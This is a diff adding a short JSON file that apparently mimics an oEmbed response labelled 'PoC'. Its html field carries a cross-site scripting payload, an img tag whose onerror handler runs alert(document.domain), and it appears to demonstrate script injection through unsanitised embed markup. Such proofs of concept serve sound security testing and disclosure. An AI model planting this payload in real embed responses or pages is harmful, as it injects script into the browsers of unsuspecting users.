@@ -1,0 +1,3 @@
+{ "version":"1.0", "type":"rich", "provider_name":"PoC",
+  "width":600, "height":300,
+  "html":"<img src=x onerror=alert(document.domain)>" }
